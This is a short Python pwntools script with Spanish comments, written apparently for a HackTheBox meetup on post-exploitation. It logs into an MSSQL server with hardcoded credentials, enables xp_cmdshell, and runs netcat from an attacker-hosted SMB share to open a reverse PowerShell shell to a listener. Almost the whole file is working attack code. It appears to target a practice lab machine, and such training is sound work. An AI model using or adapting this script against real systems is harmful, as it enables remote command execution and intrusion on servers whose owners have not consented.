from pwn import *

# Un script muy feo, para la comunidad de RedTeamRD - HackTheBox Meetup Post-Exploitation 

IP = sys.argv[1]
print(IP)

# Asegurate de tener nc64.exe en el directorio desde donde estas ejecutando el script. 
smb = process("/opt/impacket/examples/smbserver.py share -smb2support ./",shell=True)

# mssqlclient.py mssql-svc:'corporate568'@10.10.10.125 -windows-auth
p = process("/opt/impacket/examples/mssqlclient.py mssql-svc:corporate568@10.10.10.125 -windows-auth", shell=True)
p.readuntil("commands\n")
p.sendline("enable_xp_cmdshell\n")

p.sendline("xp_cmdshell \\\\"+ IP +"\\share\\nc64.exe -e powershell.exe 10.10.15.248 8080\n")

input("Presione ENTER para cerrar una vez tengas el shell")
